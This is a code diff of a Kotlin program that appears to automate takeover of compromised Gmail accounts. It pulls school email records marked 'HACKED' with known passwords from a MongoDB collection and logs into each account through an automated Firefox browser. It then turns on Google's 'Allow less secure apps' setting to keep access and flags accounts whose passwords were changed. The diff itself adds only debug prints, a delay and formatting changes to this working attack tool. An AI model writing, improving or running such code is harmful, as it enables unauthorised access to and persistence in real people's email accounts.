@@ -24,21 +24,25 @@ suspend fun main() {
     val serviceAccountDatabase = mongoClient.getDatabase("edu-school-account")
     val collection: MongoCollection<Document> = serviceAccountDatabase.getCollection("vimaru-email-info")
 
-    while (true){
+    while (true) {
         collection.random(org.bson.Document("login_status", "PASSWORD_CORRECT").append("email_status", "HACKED"))?.let {
-            if(it.containsKey("Allow less secure apps")) return
+            if (it.containsKey("Allow less secure apps")) return@let
             val gmailUsername = it.getString("email")
             val recover_email: String? = it.getString("recover_email")
             val gmailPassword = it.getString("new_pass") ?: it.getString("pass")
 
             val driver = Browser.firefox
             loginGoogle(gmailUsername, gmailPassword, driver, onLoginSuccess = {
+                println(1)
                 driver.get("https://myaccount.google.com/lesssecureapps?utm_source=google-account&utm_medium=web")
                 var accessTxt = driver.findFirstElWait(1000, 180000, "div", jsoup = false, filter = { el -> el.text.startsWith("Allow less secure apps: ") || el.text.startsWith("Cho phép ứng dụng kém an toàn: ") })?.text
                         ?: return@loginGoogle
+                println(1.5)
                 if (accessTxt == "Allow less secure apps: ON" || accessTxt == "Cho phép ứng dụng kém an toàn: BẬT") {
+                    println(2)
                     onSuccess(gmailUsername, collection, driver)
                 } else if (accessTxt == "Allow less secure apps: OFF" || accessTxt == "Cho phép ứng dụng kém an toàn: TẮT") {
+                    println(3)
                     driver.findFirstElWait(1000, 120000, ".LsSwGf", jsoup = false)?.click()
                     Thread.sleep(2000)
                     driver.navigate().refresh()
@@ -46,21 +50,28 @@ suspend fun main() {
 
                     accessTxt = driver.findFirstElWait(1000, 180000, "div", jsoup = false, filter = { el -> el.text.startsWith("Allow less secure apps: ") || el.text.startsWith("Cho phép ứng dụng kém an toàn: ") })?.text
                             ?: return@loginGoogle
+                    println(4)
                     if (accessTxt == "Allow less secure apps: ON" || accessTxt == "Cho phép ứng dụng kém an toàn: BẬT") {
-                        onSuccess(gmailUsername, collection,driver)
+                        println(5)
+                        onSuccess(gmailUsername, collection, driver)
                     }
                 }
-            }, onLoginFail = {response ->
+            }, onLoginFail = { response ->
 
-                if(response is PageResponse.PASSWORD_CHANGED || response is PageResponse.INCORECT_PASSWORD){
+                println(6)
+                if (response is PageResponse.PASSWORD_CHANGED || response is PageResponse.INCORECT_PASSWORD) {
+                    println(7)
                     collection.updateOne(Document("email", gmailUsername), Updates.combine(
                             Updates.set("login_status", "PASSWORD_CHANGED"),
                             Updates.set("email_status", null)
                     ))
                 } else {
+                    println(8)
                     print(response)
                 }
             }, recoverEmail = recover_email)
+            println(9)
+            Thread.sleep(5000)
         }
     }
 }
